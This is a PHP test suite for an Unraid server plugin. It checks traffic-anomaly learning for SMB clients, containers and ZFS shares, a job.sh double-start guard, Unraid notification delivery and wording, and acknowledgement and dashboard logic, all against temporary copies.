    same('flow first look: counters only, nothing told; SMB\'s user and machine are normal', [[], [], ['benj'], ['192.0.2.7'], [watchmanHourOfWeek($t0 - 3600)]],
        [$added, $flow['clients'], array_keys($bf['smb_users']), array_keys($bf['smb_clients']), $bf['smb_clients']['192.0.2.7']['hours']]);
    same('flow first look: containers sharing a network once, the host\'s network apart, every share', [['EmbyServer', 'app', 'kopia', 'web'], ['app-db'], ['node'],
        ['tank/UnraidSecretaryOffice', 'tank/data', 'tank/media', 'tank/tmp']], [(function (array $a) { sort($a); return $a; })(array_keys($flow['containers'])), $flow['containers']['app']['with'],
        $flow['can']['host'], (function (array $a) { sort($a); return $a; })(array_keys($flow['shares']))]);

    // five minutes later, the office's backup holds the engine's lock
    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['holder' => 'backup',
        'conns' => [$conn('192.0.2.7', 6 * $gb), $conn('192.0.2.9', 60 * $gb, 51000), $conn('127.0.0.1', 99 * $gb, 41000, 'web', 443), $conn('192.0.2.7', 2 * 1024 ** 2, 58000, 'web', 80)],
        'containers' => $cts(600 * $gb, 90 * $gb, 60 * $gb, 2 * $gb),
        'smb' => ['on' => true, 'sessions' => [$sess('s1', 'benj', '192.0.2.7', $t0 - 3600), $sess('s2', 'eve', '192.0.2.50', $t0 + 200, 'LAPTOP')]],
        'zfs' => $zfs(31 * $gb, 0, 1000, 1000, 40 * $gb)]), $book, $t0 + 300);
    same('flow: unusual while still learning — a new client with 60 GB in a round, a container with 60 GB, 30 % of a share; a new SMB user and machine',
        ['flow_client', 'flow_container', 'flow_written', 'smb_client', 'smb_user'], $kinds($added));
    $by = array_column(array_filter($book, 'watchmanOpen'), null, 'kind');
    same('flow: who and how much', [['192.0.2.9', 'smb', 60 * $gb, 5, true, 50 * $gb], ['web', 60 * $gb], ['eve', '192.0.2.50', 'LAPTOP']],
        [[$by['flow_client']['p']['ip'], $by['flow_client']['p']['service'], $by['flow_client']['p']['bytes'], $by['flow_client']['p']['minutes'],
          $by['flow_client']['p']['learning'], $by['flow_client']['p']['limit']],
         [$by['flow_container']['p']['name'], $by['flow_container']['p']['bytes']], [$by['smb_user']['p']['user'], $by['smb_user']['p']['ip'], $by['smb_user']['p']['machine']]]);
    $h = intdiv($t0 + 300, 3600);
    same('flow: the office\'s backup — Kopia\'s upload and its backup place kept apart, never told; other shares judged; a media server streams',
        [[$h => 100 * $gb], [], [$h => 40 * $gb], [], [$h => 30 * $gb], [$h => 80 * $gb]],
        [$flow['containers']['kopia']['o'], $flow['containers']['kopia']['h'], $flow['shares']['tank/UnraidSecretaryOffice']['o'],
         $flow['shares']['tank/UnraidSecretaryOffice']['h'], $flow['shares']['tank/data']['h'], $flow['containers']['EmbyServer']['h']]);
    same('flow entry: a share in words', '30 GB written into tank/data in 5 min — 30 % of the share while I\'m still learning what is normal',
        officeNotifyText('watchman', 'entry.flow_written', watchmanText($by['flow_written'], 'en'), 'en'));
    same('flow: per client and service, the server talking to itself left out', [['192.0.2.7|smb', '192.0.2.9|smb', '192.0.2.7|web'], 61 * $gb, 2 * 1024 ** 2],
        [array_keys($flow['clients']), $flow['totals']['sent']['smb'], $flow['totals']['sent']['web']]);
    same('flow: containers sharing a network counted once', [$h => $gb], $flow['containers']['app']['h']);
    same('flow: the office at work, on the page', 'backup', $flow['can']['office']);

    // the backup is done; the pull goes on, a share gets a lot written
    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look([
        'conns' => [$conn('192.0.2.7', 6 * $gb), $conn('192.0.2.9', 70 * $gb, 51000)], 'containers' => $cts(605 * $gb, 90 * $gb, 60 * $gb, 2 * $gb),
        'zfs' => $zfs(61 * $gb, 0, 1000, 1000, 40 * $gb)]), $book, $t0 + 600);
    $by = array_column(array_filter($book, 'watchmanOpen'), null, 'kind');
    same('flow: going on, the entries count on (bytes, minutes, the part of the share) — nothing new', [[], 60 * $gb, 60, 10, 70 * $gb, 10, 1],
        [$added, $by['flow_written']['p']['bytes'], $by['flow_written']['p']['pct'], $by['flow_written']['p']['minutes'], $by['flow_client']['p']['bytes'],
         $by['flow_client']['p']['minutes'], $by['flow_client']['count']]);
    same('flow: Kopia outside the backup is learned like any other', [$h => 5 * $gb], $flow['containers']['kopia']['h']);
    same('flow entry: in words (English)', '192.0.2.9 pulled 70 GB over SMB in 10 min — more than 50 GB in one round while I\'m still learning what is normal',
        officeNotifyText('watchman', 'entry.flow_client', watchmanText($by['flow_client'], 'en'), 'en'));

    // snapshots: one taken (written drops: what came since), one deleted (it grew: can't be told — left out)
    [$added, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs(2 * $gb, 5 * $gb, $t0 + 850, $t0 + 880)]), $book, $t0 + 900);
    same('flow written: a new snapshot counts what came since it, a deleted one leaves the round out', [62 * $gb, 0],
        [$flow['totals']['written']['tank/data'], $flow['totals']['written']['tank/media'] ?? 0]);
    same('flow written: since the latest snapshot, and whether there is one', [2 * $gb, $t0 + 850, true, false],
        [$flow['shares']['tank/data']['w'], $flow['shares']['tank/data']['s'], $flow['shares']['tank/data']['snap'], $flow['shares']['tank/tmp']['snap']]);
    // the pool asleep: never asked, its counters kept; awake again: what came meanwhile
    [, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => ['datasets' => [], 'pools' => [], 'asleep' => ['tank', 'cold']]]), $book, $t0 + 1200);
    same('flow: a sleeping pool keeps its counters', [2 * $gb, $t0 + 850], $cnt['ds']['tank/data']);
    [, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['zfs' => $zfs(3 * $gb, 5 * $gb, $t0 + 850, $t0 + 880)]), $book, $t0 + 1500);
    same('flow: awake again — counted on', 63 * $gb, $flow['totals']['written']['tank/data']);
    // a container restarted: its counters start anew
    $re = $cts(605 * $gb, 90 * $gb, 60 * $gb, 2 * $gb);
    $re['web'] = $ct(301, 'n3b', 3 * 1024 ** 2, 'nginx');
    [, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['containers' => $re]), $book, $t0 + 1800);
    same('flow: a restarted container counts from its start (containers not looked at meanwhile: counted on)', 60 * $gb + 3 * 1024 ** 2,
        array_sum($flow['containers']['web']['h']));

    // «I know, thanks» on the learning ones: that much is normal now
    $b2 = ['flow' => $bf];
    foreach ($book as $i => $e) {
        if (watchmanOpen($e)) {
            watchmanFlowAdopt($b2, $e, $t0 + 2000);
            $book[$i]['noted'] = $t0 + 2000;
        }
    }
    $bf = $b2['flow'];
    same('flow ack: the most of the pull is normal for it; the user and the machine known', [70 * $gb, 60 * $gb, true, true],
        [$bf['ack']['flow_client:192.0.2.9|smb']['bytes'] ?? null, $bf['ack']['flow_container:web']['bytes'] ?? null, isset($bf['smb_users']['eve']), isset($bf['smb_clients']['192.0.2.50'])]);
    $prevTime = $t0 + 2100;
    $cnt = ['time' => $prevTime, 'conns' => ['192.0.2.20:445>192.0.2.9:52000' => 0], 'cts' => $cnt['cts'], 'ds' => $cnt['ds'], 'smb' => []];
    [$added] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.9', 100 * $gb, 52000)]]), $book, $t0 + 2400);
    same('flow ack: twice as much again stays quiet (under ' . WATCH_FLOW_FACTOR . ' × the normal)', [], $added);

    // learned: a client with a week and more of history — unusual is far more than at that time of the week
    $t = strtotime('2026-10-12 10:20:00');               // Monday
    $bfL = ['since' => $t - 9 * 86400, 'smb_users' => ['benj' => $t - 9 * 86400],
            'smb_clients' => ['192.0.2.7' => ['first' => $t - 9 * 86400, 'last' => $t - 600, 'hours' => [watchmanHourOfWeek($t)], 'name' => '']], 'ack' => []];
    $flowL = ['since' => $t - 9 * 86400, 'clients' => ['192.0.2.7|smb' => watchmanFlowSeries($t - 9 * 86400,
        ['last' => $t - 86400, 'h' => [intdiv($t - 7 * 86400, 3600) => $gb, intdiv($t - 7 * 86400 - 3600, 3600) => intdiv($gb, 2), intdiv($t - 3 * 86400, 3600) => 2 * $gb]])],
        'containers' => [], 'shares' => [], 'totals' => ['sent' => [], 'written' => []]];
    same('flow usual: the most at this time of the week (±1 h), or a quarter of the busiest hour', $gb, watchmanFlowUsual($flowL['clients']['192.0.2.7|smb']['h'], $t));
    $k = '192.0.2.20:445>192.0.2.7:60000';
    $bookL = [];
    $prevL = ['time' => $t - 300, 'conns' => [$k => 0], 'cts' => [], 'ds' => [], 'smb' => ['s1']];
    [$added, $flowL, $prevL] = watchmanFlowCompare($bfL, $flowL, $prevL, $look(['conns' => [$conn('192.0.2.7', 3 * $gb, 60000)],
        'smb' => ['on' => true, 'sessions' => [$sess('s1', 'benj', '192.0.2.7', $t - 7200), $sess('s3', 'benj', '192.0.2.7', $t - 100)]]]), $bookL, $t);
    same('flow learned: 3 GB in the hour, usually 1 GB — not unusual (limit 4 GB); a session at a known hour', [], $added);
    [$added, $flowL, $prevL] = watchmanFlowCompare($bfL, $flowL, $prevL, $look(['conns' => [$conn('192.0.2.7', 5 * $gb, 60000)],
        'smb' => ['on' => true, 'sessions' => [$sess('s1', 'benj', '192.0.2.7', $t - 7200), $sess('s3', 'benj', '192.0.2.7', $t - 100)]]]), $bookL, $t + 300);
    $e = array_values(array_filter($bookL, 'watchmanOpen'))[0] ?? [];
    same('flow learned: 5 GB in the hour — told, with what is normal', [['flow_client'], '192.0.2.7 pulled 5.0 GB over SMB in 10 min — usually at most 1.0 GB per hour at this time'],
        [$added, officeNotifyText('watchman', 'entry.flow_client', watchmanText($e, 'en'), 'en')]);
    $wed3 = strtotime('2026-10-14 03:10:00');
    $prevL['time'] = $wed3 - 300;
    [$added] = watchmanFlowCompare($bfL, $flowL, $prevL, $look(['conns' => [], 'smb' => ['on' => true, 'sessions' => [$sess('s4', 'benj', '192.0.2.7', $wed3 - 60)]]]), $bookL, $wed3);
    $e = array_column(array_filter($bookL, 'watchmanOpen'), null, 'kind')['smb_hour'] ?? [];
    same('flow SMB: a session at an hour that machine never used', [['smb_hour'], [watchmanHourOfWeek($wed3)], 'Wed 03:00'],
        [$added, $e['p']['hours'] ?? null, watchmanText($e)['hours'] ?? null]);
    $b3 = ['flow' => $bfL];
    watchmanFlowAdopt($b3, $e, $wed3);
    same('flow SMB ack: the hour is normal for it', true, in_array(watchmanHourOfWeek($wed3), $b3['flow']['smb_clients']['192.0.2.7']['hours'], true));

    // tidy: hours beyond the kept days and tiny past hours go
    $old = ['since' => 0, 'clients' => ['x|smb' => watchmanFlowSeries($t - 20 * 86400, ['last' => $t, 'h' => [intdiv($t - 15 * 86400, 3600) => 9 * $gb,
        intdiv($t - 7200, 3600) => 1000, intdiv($t - 3600, 3600) => 5 * $gb, intdiv($t, 3600) => 10]])], 'containers' => [], 'shares' => [], 'totals' => ['sent' => [], 'written' => []]];
    $bfT = ['since' => 0, 'smb_users' => [], 'smb_clients' => [], 'ack' => ['flow_client:gone|smb' => ['bytes' => 1, 'time' => 0]]];
    watchmanFlowTidy($bfT, $old, $t);
    same('flow tidy: kept days, tiny past hours out, the hour going on stays; notes of what is gone go', [[intdiv($t - 3600, 3600), intdiv($t, 3600)], []],
        [array_keys($old['clients']['x|smb']['h']), $bfT['ack']]);

    // a whole round with the data flow, on copies: flow.json, the page, the metrics, «I know, thanks»
    $tmp = sys_get_temp_dir() . '/office-tests-flow-' . getmypid();
    $src = "$tmp/src";
    $data = "$tmp/data";
    @mkdir("$src/plugins", 0700, true);
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd", 'shadow' => "$src/shadow",
              'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini", 'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
    file_put_contents($paths['syslog'], '');
    file_put_contents($paths['passwd'], "root:x:0:0::/root:/bin/bash\n");
    $now = $t0;
    $looks = [$look(['conns' => [$conn('192.0.2.7', $gb)], 'zfs' => $zfs($gb, 0)]),
              $look(['conns' => [$conn('192.0.2.7', $gb), $conn('192.0.2.9', 60 * $gb, 51000)], 'zfs' => $zfs(2 * $gb, 0)])];
    $i = 0;
    $flowFn = function (?array $containers) use (&$looks, &$i) {
        return $looks[$i++];
    };
    $docker = fn () => [];
    $acks = "$tmp/acks.json";
    $r = watchmanRound($paths, $data, 1000, $now, $docker, false, $acks, $flowFn);
    same('flow round: taken over — learning starts, nothing told', [true, [], true], [$r['fresh'], $r['added'], is_file("$data/flow.json")]);
    $r = watchmanRound($paths, $data, 1000, $now + 300, $docker, false, $acks, $flowFn);
    same('flow round: a new client pulling 60 GB', ['flow_client'], $r['added']);
    $page = watchmanPageState($data, $now + 400, false);
    $f = $page['flow'];
    same('flow page: learning, per client the last 24 h, the share, what works here', [0, 7, ['192.0.2.9', 60 * $gb], ['tank/data', $gb], true, ['tank'], ['cold']],
        [$f['days'], $f['learn'], [$f['clients'][0]['ip'], $f['clients'][0]['day']], [$f['shares'][0]['share'], $f['shares'][0]['day']], $f['can']['ss'],
         $f['can']['zfs']['pools'], $f['can']['zfs']['asleep']]);
    check('flow page: no counters, no internals', !preg_match('/"(?:conns|cts|ds|_h|_f|run|h|o)"\s*:/', json_encode($page['flow'])));
    $m = array_column(watchmanMetrics($data), null, 'name');
    same('flow metrics: sent per service, written per share (counters)', ['counter', [['service' => 'smb'], 60 * $gb], [['share' => 'tank/data'], $gb]],
        [$m['uso_watchman_sent_bytes_total']['type'] ?? null, $m['uso_watchman_sent_bytes_total']['samples'][0] ?? null, $m['uso_watchman_written_bytes_total']['samples'][0] ?? null]);
    watchmanAck('*', $data, $now + 500, false);
    same('flow ack through his page: the client\'s normal raised', 60 * $gb, watchmanLoad($data)['baseline']['flow']['ack']['flow_client:192.0.2.9|smb']['bytes'] ?? null);
    $f = array_column(watchmanFindings([watchmanEntry('flow_client', 'flow_client:x', $now, ['ip' => '192.0.2.9', 'service' => 'smb', 'bytes' => 5, 'minutes' => 3])]), null, 'id');
    same('flow finding for the team lead: what moves left out (his «I know, thanks» holds while a pull goes on)', [false, false, '5 B'],
        [isset($f['flow_client']['params']['minutes']), isset($f['flow_client']['params']['usual']), $f['flow_client']['params']['size'] ?? null]);
    @unlink(watchmanLockFile($data, 'book'));
    @unlink(watchmanFlowCountersFile($data));
    exec('rm -rf ' . escapeshellarg($tmp));
}

/** job.sh: a second start of the same job in the same minute ends quietly, with one line for the syslog */
function testJobGuard(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-jobsh-' . getmypid();
    @mkdir("$tmp/plugin/scripts", 0700, true);
    $script = (string) file_get_contents(OFFICE_DIR . '/plugin/scripts/job.sh');
    $script = str_replace(['DIR=/usr/local/emhttp/plugins/unraid-secretary-office', 'RUN=/var/run/unraid-secretary-office', 'logger -t unraid-secretary-office'],
                          ["DIR=$tmp/plugin", "RUN=$tmp/run", "echo >> $tmp/syslog"], $script, $n);
    same('job guard: the copy points to the test folder', 3, $n);
    file_put_contents("$tmp/job.sh", $script);
    file_put_contents("$tmp/plugin/scripts/agent.sh", "echo \"\$1\" >> $tmp/ran\n");
    $run = function () use ($tmp): string {
        exec('bash ' . escapeshellarg("$tmp/job.sh") . ' watch 2>&1', $out, $code);
        return "$code";
    };
    for ($i = 0; $i < 2; $i++) {        // a minute turning between the two starts: once more
        @unlink("$tmp/ran");
        @unlink("$tmp/syslog");
        @unlink("$tmp/run/job-watch.minute");
        $minute = date('YmdHi');
        $codes = [$run(), $run()];
        if (date('YmdHi') === $minute) {
            break;
        }
    }
    same('job guard: the first start runs, the second in the same minute ends quietly', [['0', '0'], "watch\n", "job watch: second start in the same minute skipped\n"],
        [$codes, @file_get_contents("$tmp/ran"), @file_get_contents("$tmp/syslog")]);
    file_put_contents("$tmp/run/job-watch.minute", "200001010000\n");
    $run();
    same('job guard: another minute runs again', "watch\nwatch\n", @file_get_contents("$tmp/ran"));
    same('job guard: an unknown job is refused before anything', '2', (function () use ($tmp) { exec('bash ' . escapeshellarg("$tmp/job.sh") . ' nope', $o, $c); return "$c"; })());
    exec('rm -rf ' . escapeshellarg($tmp));
}

// ===================================================================== notifications

/**
 * Reports to Unraid's notifications: the caretaker's transitions (new red →
 * told once it stayed, same → quiet, solved and back → told again), with a
 * stand-in notify in a temporary folder; Jack Emby's choice of what to tell.
 */
function testNotify(): void
{
    $tmp = sys_get_temp_dir() . '/office-tests-notify-' . getmypid();
    @mkdir($tmp, 0700, true);
    $log = "$tmp/notified";
    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($log) . "\necho >> " . escapeshellarg($log) . "\n");
    chmod("$tmp/notify", 0755);
    $before = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
    $calls = function () use ($log): array {
        $out = [];
        foreach (array_filter(explode("\n", (string) @file_get_contents($log))) as $line) {
            $args = explode("\x1f", rtrim($line, "\x1f"));
            $o = [];
            for ($i = 0; $i + 1 < count($args); $i += 2) {
                $o[$args[$i]] = $args[$i + 1];
            }
            $out[] = $o;
        }
        return $out;
    };

    // Unraid names a notification after the second its script reads the clock: a stand-in that does so late in its
    // run (like Unraid's, ~0.4 s) — three sent in a row must land in three different seconds, none overwritten
    $slow = "$tmp/notify-slow";
    $secs = "$tmp/seconds";
    file_put_contents($slow, "#!/bin/bash\nsleep 0.4\ndate +%s >> " . escapeshellarg($secs) . "\n");
    chmod($slow, 0755);
    putenv("OFFICE_NOTIFY_BIN=$slow");
    usleep((int) ((1 - fmod(microtime(true), 1)) * 1e6) + 750000);      // start late in a second: the first one's clock
                                                                         // falls into the next, where the second one starts
    foreach (['a', 'b', 'c'] as $s) {
        officeNotify($s, $s);
    }
    $got = array_filter(explode("\n", (string) @file_get_contents($secs)));
    same('notify: three in a row, three different seconds (none overwritten)', 3, count(array_unique($got)));
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");

    // which findings are red: required and known to be missing, one key per thing
    $f = fn (string $id, string $level, ?bool $ok, array $p = []) => finding($id, $level, $ok, $p);
    $red = caretakerRed(['backup' => [$f('setup', 'required', true), $f('schedule', 'required', false), $f('kopia_repo', 'required', null),
                                      $f('drift', 'recommended', false), $f('kopia_running', 'required', false, ['name' => 'kopia'])],
                         'emby'   => [$f('python', 'required', false)]]);
    same('notify: red findings', ['backup:schedule:', 'backup:kopia_running:kopia', 'emby:python:'], array_keys($red));

    // the steps by themselves
    $t0 = 1_800_000_000;
    $one = ['backup:schedule:' => ['desk' => 'backup', 'id' => 'schedule', 'params' => []]];
    [$tr, $tell] = caretakerNotifyStep([], $one, $t0, true, 1800);
    same('notify step: new — waits', [0, $t0, null], [count($tell), $tr['backup:schedule:']['since'], $tr['backup:schedule:']['told']]);
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 1799, true, 1800);
    same('notify step: not yet half an hour', 0, count($tell));
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 1800, true, 1800);
    same('notify step: stayed — told', ['schedule'], array_column($tell, 'id'));
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 9000, true, 1800);
    same('notify step: same — quiet', 0, count($tell));
    [$tr, $tell] = caretakerNotifyStep($tr, [], $t0 + 9100, true, 1800);
    same('notify step: solved — forgotten', [], $tr);
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 9200, true, 1800);
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 11000, true, 1800);
    same('notify step: back — told again', ['schedule'], array_column($tell, 'id'));
    [$tr, $tell] = caretakerNotifyStep([], $one, $t0, false, 1800);
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 1800, false, 1800);
    same('notify step: switched off — nothing told', 0, count($tell));
    [$tr, $tell] = caretakerNotifyStep($tr, $one, $t0 + 3600, true, 1800);
    same('notify step: switched on again — no backlog', 0, count($tell));

    // the whole way, with the state file and the stand-in notify
    $file = "$tmp/caretaker/notify.json";
    $checks = ['backup' => [$f('schedule', 'required', false)], 'emby' => [$f('python', 'required', true)]];
    caretakerNotifyEvaluate($checks, $file, $t0, 'de');
    same('notify: a new red finding waits', 0, count($calls()));
    check('notify: state written', is_file($file));
    caretakerNotifyEvaluate($checks, $file, $t0 + 1800, 'de');
    $c = $calls();
    same('notify: told after half an hour', 1, count($c));
    same('notify: subject in Unraid\'s language', 'Unraid Secretary Office: Etwas Neues zu erledigen', $c[0]['-s'] ?? null);
    same('notify: event as the engine\'s', 'Unraid Secretary Office', $c[0]['-e'] ?? null);
    same('notify: a warning', 'warning', $c[0]['-i'] ?? null);
    check('notify: what is missing in the bell', str_contains($c[0]['-d'] ?? '', 'Herr Backupsi — Ein nächtliches Backup ist geplant'), $c[0]['-d'] ?? '');
    check('notify: long text with what to do, lines as Unraid\'s \n', str_contains($c[0]['-m'] ?? '', 'Herr Backupsi → Zeitplan')
        && str_contains($c[0]['-m'] ?? '', '\n') && !str_contains($c[0]['-m'] ?? '', "\n"), $c[0]['-m'] ?? '');
    $page = caretakerNotifyPublic(readJson($file) ?? []);
    same('notify: the last report for the page', [true, ['schedule']], [$page['on'], array_column($page['last']['items'] ?? [], 'id')]);
    caretakerNotifyEvaluate($checks, $file, $t0 + 5400, 'de');
    same('notify: same finding — quiet', 1, count($calls()));
    caretakerNotifyEvaluate(['backup' => [$f('schedule', 'required', true)]], $file, $t0 + 6000, 'de');
    same('notify: solved — no all clear', 1, count($calls()));
    $two = ['backup' => [$f('schedule', 'required', false)], 'emby' => [$f('python', 'required', false)]];
    caretakerNotifyEvaluate($two, $file, $t0 + 6100, 'en');
    caretakerNotifyEvaluate($two, $file, $t0 + 7900, 'en');
    $c = $calls();
    same('notify: back and a second one — one notification', 2, count($c));
    same('notify: both in it (English)', 'Unraid Secretary Office: 2 new things to do', $c[1]['-s'] ?? null);
    check('notify: both listed', str_contains($c[1]['-d'] ?? '', 'Mr. Backupsy — A nightly backup is scheduled')
        && str_contains($c[1]['-d'] ?? '', 'Jack Emby — Python 3'), $c[1]['-d'] ?? '');
    $data = readJson($file) ?? [];
    $data['on'] = false;
    file_put_contents($file, json_encode($data));
    $other = ['backup' => [$f('dumps_share', 'required', false, ['share' => ''])]];
    caretakerNotifyEvaluate($other, $file, $t0 + 8000, 'en');
    caretakerNotifyEvaluate($other, $file, $t0 + 9800, 'en');
    same('notify: switched off — quiet', 2, count($calls()));
    same('notify: switched off — the page knows', false, caretakerNotifyPublic(readJson($file) ?? [])['on']);

    // Unraid's language, when the office speaks it
    foreach (['de_DE' => 'de', 'fr_FR' => 'fr', 'pt_BR' => 'en', '' => 'en', '../x' => 'en'] as $locale => $want) {
        file_put_contents("$tmp/dynamix.cfg", "[display]\nlocale=\"$locale\"\n[notify]\nalert=\"1\"\n");
        same("notify language for locale '$locale'", $want, officeNotifyLang("$tmp/dynamix.cfg"));
    }
    same('notify text: plural and placeholder', '3 neue Dinge zu erledigen', officeNotifyText('caretaker', 'notify.subject', ['n' => 3], 'de'));
    same('notify text: unknown key', '', officeNotifyText('caretaker', 'notify.nothing', [], 'de'));
    putenv("OFFICE_NOTIFY_BIN=$tmp/none");
    check('notify: no notify script — nothing, no error', !officeNotify('x', 'y'));

    // Jack Emby: only real runs that went wrong
    foreach ([['run', 'failed', [], 'failed'], ['run', 'aborted', [], 'aborted'], ['run', 'config', [], 'config'],
              ['run', 'errors', [], 'errors'], ['run', 'ok', ['errors' => 2], 'errors'], ['run', 'ok', ['errors' => 0], null],
              ['run', 'busy', [], null], ['run', 'refused', [], null], ['dry', 'failed', [], null], ['report', 'failed', [], null]] as [$mode, $result, $status, $want]) {
        same("emby notify: $mode $result " . json_encode($status), $want, embyNotifyOutcome($mode, $result, $status));
    }

    // every notification text the code asks for by name exists in English
    foreach (array_merge(glob(OFFICE_DIR . '/agent/desks/*.php') ?: [], glob(OFFICE_DIR . '/agent/lib/*.php') ?: []) as $php) {
        preg_match_all("/officeNotifyText\\(\\s*'([a-z]+)',\\s*'([a-z0-9_.]+)'/", (string) file_get_contents($php), $m, PREG_SET_ORDER);
        foreach ($m as [, $desk, $key]) {
            check(basename($php) . " asks for notification text $desk.$key", officeNotifyText($desk, $key, ['n' => 2], 'en') !== '');
        }
    }

    putenv($before === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$before");
    exec('rm -rf ' . escapeshellarg($tmp));
}

/**
 * The team lead's «I know, thanks»: what a finding's signature depends on,
 * which findings get marked (never a must), how the notes are kept tidy, the
 * file on a copy — and the Dashboard tile counting only what is open, and
 * saying what the engine is doing while it runs.
 */
function testCaretakerAcks(): void
{
    $f = fn (string $id, string $level, ?bool $ok, array $p = []) => finding($id, $level, $ok, $p);

    // the signature: what it is about — not the order of its params, not an age or a size growing
    $upd = fn (string $latest, string $level = 'recommended') => $f('office_update', $level, false, ['version' => '1.26', 'latest' => $latest]);
    $sig = caretakerAckSig('caretaker', $upd('1.27'));
    check('ack sig: shaped for the action', (bool) preg_match(CARETAKER_ACK_SIG, $sig), $sig);
    same('ack sig: params in another order', $sig, caretakerAckSig('caretaker', $f('office_update', 'recommended', false, ['latest' => '1.27', 'version' => '1.26'])));
    check('ack sig: another version — comes back', $sig !== caretakerAckSig('caretaker', $upd('1.28')));
    check('ack sig: another level — comes back', $sig !== caretakerAckSig('caretaker', $upd('1.27', 'required')));
    check('ack sig: another desk', $sig !== caretakerAckSig('backup', $upd('1.27')));
    $cont = fn (string $name) => caretakerAckSig('caretaker', $f('other_backup_container', 'hint', null, ['name' => $name, 'image' => 'duplicati']));
    check('ack sig: another container — comes back', $cont('a') !== $cont('b'));
    $old = fn (int $n, int $days, string $size) => caretakerAckSig('cleanup', $f('trash_old', 'recommended', false, ['n' => $n, 'days' => $days, 'size' => $size]));
    same('ack sig: the storeroom only getting older and bigger — the same', $old(2, 31, '2 GB'), $old(2, 32, '2.1 GB'));
    check('ack sig: one more old run — comes back', $old(2, 31, '2 GB') !== $old(3, 31, '2 GB'));

    // the marks: a noted recommendation or note counts no more; a must or something in place is never marked
    $t0 = 1_800_000_000;
    $checks = ['emby'      => [$f('schedule', 'recommended', false), $f('python', 'required', false)],
               'caretaker' => [$f('other_backup_container', 'hint', null, ['name' => 'duplicati', 'image' => 'x']), $f('community_apps', 'recommended', true)]];
    $s = fn (string $desk, int $i) => caretakerAckSig($desk, $checks[$desk][$i]);
    $note = fn (string $desk, string $id) => ['desk' => $desk, 'id' => $id, 'time' => $t0, 'seen' => $t0];
    $acks = [$s('emby', 0) => $note('emby', 'schedule'), $s('caretaker', 0) => $note('caretaker', 'other_backup_container'),
             $s('emby', 1) => $note('emby', 'python'), $s('caretaker', 1) => $note('caretaker', 'community_apps')];   // the last two can't be noted
    [$marked, $kept] = caretakerAckStep($checks, $acks, $t0 + 60);
    same('ack mark: every finding has its sig', [true, true, true, true],
        array_map(fn ($x) => preg_match(CARETAKER_ACK_SIG, (string) ($x['sig'] ?? '')) === 1, [...$marked['emby'], ...$marked['caretaker']]));
    same('ack mark: the noted recommendation and note', [true, true], [$marked['emby'][0]['acked'] ?? false, $marked['caretaker'][0]['acked'] ?? false]);
    same('ack mark: never a must', false, $marked['emby'][1]['acked'] ?? false);
    same('ack mark: nothing in place', false, $marked['caretaker'][1]['acked'] ?? false);
    same("ack mark: the reports to Unraid don't change", caretakerRed($checks), caretakerRed($marked));

    // tidy: still there → seen once a day; in place → forgotten (back again, shown again); not seen for a month → forgotten
    same('ack tidy: seen not rewritten within a day', $t0, $kept[$s('emby', 0)]['seen']);
    [, $kept] = caretakerAckStep($checks, $acks, $t0 + 86400);
    same('ack tidy: seen once a day', $t0 + 86400, $kept[$s('emby', 0)]['seen']);
    check('ack tidy: something in place — its note forgotten', !isset($kept[$s('caretaker', 1)]));
    $solved = $checks;
    $solved['emby'][0]['ok'] = true;
    [, $kept] = caretakerAckStep($solved, $acks, $t0 + 60);
    check('ack tidy: sorted out — forgotten', !isset($kept[$s('emby', 0)]));
    [$back] = caretakerAckStep($checks, $kept, $t0 + 120);
    same('ack tidy: turns up again — shown again', false, $back['emby'][0]['acked'] ?? false);
    $gone = ['emby' => [], 'caretaker' => []];
    [, $kept] = caretakerAckStep($gone, $acks, $t0 + 29 * 86400);
    check('ack tidy: not seen for a while (desk let go) — kept', isset($kept[$s('emby', 0)]));
    [, $kept] = caretakerAckStep($gone, $acks, $t0 + 31 * 86400);
    same('ack tidy: not seen for a month — forgotten', [], $kept);

    // the file, on a copy
    $tmp = sys_get_temp_dir() . '/office-tests-acks-' . getmypid();
    $file = "$tmp/caretaker/acks.json";
    caretakerAckApply($checks, $file, $t0);
    check('ack file: nothing noted — no file written', !is_file($file));
    caretakerWrite($file, ['acks' => [$s('emby', 0) => $note('emby', 'schedule'), '../x' => $note('emby', 'x'), $s('caretaker', 0) => 'odd']]);
    same('ack file: odd entries left out', [$s('emby', 0)], array_keys(caretakerAckRead($file)));
    $marked = caretakerAckApply($checks, $file, $t0 + 60);
    same('ack file: marked from the file', true, $marked['emby'][0]['acked'] ?? false);
    caretakerAckApply($solved, $file, $t0 + 120);
    same('ack file: sorted out — gone from the file', [], caretakerAckRead($file));
    exec('rm -rf ' . escapeshellarg($tmp));

    // the Dashboard tile (src/dashboard.php): only open points of desks that work here
    require_once OFFICE_DIR . '/src/dashboard.php';
    [$marked] = caretakerAckStep($checks, $acks, $t0);
    $all = ['emby' => 1, 'caretaker' => 1];
    same('dashboard: without notes — to do and recommended', [1, 1], officeDashCareCounts(['checks' => $checks], $all));
    same('dashboard: the noted recommendation counts no more', [1, 0], officeDashCareCounts(['checks' => $marked], $all));
